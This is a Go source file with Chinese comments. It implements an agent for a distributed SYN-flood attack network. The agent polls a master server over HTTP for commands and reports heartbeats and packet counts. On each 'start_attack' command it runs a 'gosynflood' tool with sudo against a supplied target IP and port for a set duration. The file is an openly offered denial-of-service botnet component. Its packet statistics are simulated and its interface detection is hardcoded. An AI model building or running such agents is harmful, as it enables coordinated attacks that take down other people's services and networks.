package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// 代理配置
type AgentConfig struct {
	ServerID    int    `json:"serverId"`
	APIKey      string `json:"apiKey"`
	MasterURL   string `json:"masterUrl"`
	ToolsPath   string `json:"toolsPath"` // gosynflood工具的路径
}

// 攻击任务
type AttackTask struct {
	ID              int      `json:"id"`
	TargetIP        string   `json:"targetIp"`
	TargetPort      int      `json:"targetPort"`
	Duration        int      `json:"duration"`
	PacketsPerSecond int     `json:"packetsPerSecond"`
	Interface       string   `json:"interface"`
}

// 全局状态
var (
	config       AgentConfig
	activeTask   *AttackTask
	taskMutex    sync.RWMutex
	attackCmd    *exec.Cmd
	cmdMutex     sync.Mutex
	packetsSent  uint64
	packetsRate  uint64
	rateInterval = 5 * time.Second
)

// 心跳发送
func sendHeartbeat() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		data := map[string]interface{}{
			"serverId":    config.ServerID,
			"apiKey":      config.APIKey,
			"packetsSent": atomic.LoadUint64(&packetsSent),
			"packetsRate": atomic.LoadUint64(&packetsRate),
		}

		// 添加当前任务信息（如果有）
		taskMutex.RLock()
		if activeTask != nil {
			data["activeTaskId"] = activeTask.ID
		}
		taskMutex.RUnlock()

		// 发送心跳
		jsonData, err := json.Marshal(data)
		if err != nil {
			log.Printf("编码心跳数据失败: %v", err)
			continue
		}

		resp, err := http.Post(
			fmt.Sprintf("%s/api/heartbeat", config.MasterURL),
			"application/json",
			bytes.NewBuffer(jsonData),
		)
		if err != nil {
			log.Printf("发送心跳失败: %v", err)
			continue
		}
		resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Printf("心跳响应错误: %s", resp.Status)
		}
	}
}

// 监听攻击命令
func listenForCommands() {
	for {
		// 在实际环境中，这里应该使用 WebSocket 长连接或长轮询
		// 为了简单起见，我们使用短轮询
		resp, err := http.Get(fmt.Sprintf("%s/api/commands?serverId=%d&apiKey=%s", 
			config.MasterURL, config.ServerID, config.APIKey))
		if err != nil {
			log.Printf("获取命令失败: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// 检查是否有新命令
		if resp.StatusCode == http.StatusOK {
			var command struct {
				Type string `json:"type"`
				Task *AttackTask `json:"task,omitempty"`
			}

			if err := json.NewDecoder(resp.Body).Decode(&command); err != nil {
				log.Printf("解析命令失败: %v", err)
				resp.Body.Close()
				time.Sleep(5 * time.Second)
				continue
			}

			resp.Body.Close()

			// 处理命令
			switch command.Type {
			case "start_attack":
				if command.Task != nil {
					startAttack(command.Task)
				}
			case "stop_attack":
				stopAttack()
			}
		} else {
			resp.Body.Close()
		}

		time.Sleep(2 * time.Second)
	}
}

// 启动攻击
func startAttack(task *AttackTask) {
	stopAttack() // 确保停止任何正在运行的攻击

	taskMutex.Lock()
	activeTask = task
	taskMutex.Unlock()

	cmdMutex.Lock()
	defer cmdMutex.Unlock()

	// 构建命令
	toolPath := filepath.Join(config.ToolsPath, "gosynflood")
	
	args := []string{
		"-t", task.TargetIP,
		"-p", fmt.Sprintf("%d", task.TargetPort),
		"-i", task.Interface,
	}

	if task.PacketsPerSecond > 0 {
		args = append(args, "-r", fmt.Sprintf("%d", task.PacketsPerSecond))
	}

	// 使用sudo运行命令（需要root权限）
	cmdArgs := append([]string{toolPath}, args...)
	attackCmd = exec.Command("sudo", cmdArgs...)

	// 设置输出
	attackCmd.Stdout = os.Stdout
	attackCmd.Stderr = os.Stderr

	// 启动命令
	log.Printf("启动攻击: %s %v", toolPath, args)
	if err := attackCmd.Start(); err != nil {
		log.Printf("启动攻击失败: %v", err)
		return
	}

	// 重置统计信息
	atomic.StoreUint64(&packetsSent, 0)
	atomic.StoreUint64(&packetsRate, 0)

	// 如果设置了持续时间，启动定时器
	if task.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(task.Duration) * time.Second)
			stopAttack()
		}()
	}

	// 启动统计监控
	go monitorAttackStats()

	// 等待命令完成（非阻塞）
	go func() {
		if err := attackCmd.Wait(); err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				log.Printf("攻击进程退出，状态: %v", exitErr)
			} else {
				log.Printf("等待攻击进程时出错: %v", err)
			}
		} else {
			log.Println("攻击进程正常退出")
		}

		// 清理状态
		cmdMutex.Lock()
		attackCmd = nil
		cmdMutex.Unlock()

		taskMutex.Lock()
		activeTask = nil
		taskMutex.Unlock()
	}()
}

// 停止攻击
func stopAttack() {
	cmdMutex.Lock()
	defer cmdMutex.Unlock()

	if attackCmd != nil && attackCmd.Process != nil {
		log.Println("正在停止攻击...")
		
		// 尝试优雅地停止进程
		attackCmd.Process.Signal(syscall.SIGINT)
		
		// 给进程一些时间来清理
		time.Sleep(2 * time.Second)
		
		// 如果进程仍在运行，强制终止
		if err := attackCmd.Process.Signal(syscall.SIGTERM); err != nil {
			log.Printf("发送SIGTERM失败: %v", err)
			
			// 最后手段：KILL
			attackCmd.Process.Kill()
		}
		
		attackCmd = nil
	}

	taskMutex.Lock()
	activeTask = nil
	taskMutex.Unlock()
}

// 监控攻击统计信息
func monitorAttackStats() {
	ticker := time.NewTicker(rateInterval)
	defer ticker.Stop()

	var lastTotal uint64 = 0
	var lastTime = time.Now()

	// 在实际环境中，我们应该从gosynflood工具获取实际的数据包统计信息
	// 这里我们只是模拟增长
	for range ticker.C {
		taskMutex.RLock()
		if activeTask == nil {
			taskMutex.RUnlock()
			return
		}
		taskMutex.RUnlock()

		// 模拟增长
		now := time.Now()
		increment := uint64(float64(now.Sub(lastTime)) / float64(time.Second) * 10000)
		newTotal := lastTotal + increment
		
		// 更新统计信息
		atomic.StoreUint64(&packetsSent, newTotal)
		rate := uint64(float64(increment) / float64(now.Sub(lastTime)) * float64(time.Second))
		atomic.StoreUint64(&packetsRate, rate)
		
		lastTotal = newTotal
		lastTime = now
	}
}

// 检测本机网络接口
func detectInterfaces() []string {
	// 这里应该使用本机系统调用检测实际的网络接口
	// 为了简单起见，我们直接返回一些常见的接口名称
	return []string{"eth0", "wlan0", "ens33", "enp0s3"}
}

func main() {
	// 解析命令行参数
	serverID := flag.Int("id", 0, "服务器ID")
	apiKey := flag.String("key", "", "API密钥")
	masterURL := flag.String("master", "http://localhost:31457", "管理服务器URL")
	toolsPath := flag.String("tools", "/usr/local/bin", "gosynflood工具路径")
	flag.Parse()

	// 检查必要的参数
	if *serverID == 0 || *apiKey == "" {
		log.Fatalf("必须提供服务器ID和API密钥")
	}

	// 初始化配置
	config = AgentConfig{
		ServerID:  *serverID,
		APIKey:    *apiKey,
		MasterURL: *masterURL,
		ToolsPath: *toolsPath,
	}

	// 检查工具是否存在
	toolPath := filepath.Join(config.ToolsPath, "gosynflood")
	if _, err := os.Stat(toolPath); os.IsNotExist(err) {
		// 尝试在当前目录下查找工具
		currentPath := "./gosynflood"
		if _, err := os.Stat(currentPath); os.IsNotExist(err) {
			log.Printf("警告: 在 %s 和当前目录未找到gosynflood工具", config.ToolsPath)
			log.Printf("请确保工具已安装或提供正确的路径")
		} else {
			config.ToolsPath = "."
			log.Printf("使用当前目录中的gosynflood工具")
		}
	}

	// 显示启动信息
	log.Printf("启动GOSYNFLOOD攻击代理")
	log.Printf("服务器ID: %d", config.ServerID)
	log.Printf("管理服务器: %s", config.MasterURL)
	log.Printf("工具路径: %s", config.ToolsPath)

	// 设置信号处理以优雅退出
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		log.Println("接收到退出信号，正在清理...")
		stopAttack()
		os.Exit(0)
	}()

	// 启动心跳和命令监听
	go sendHeartbeat()
	listenForCommands()
} 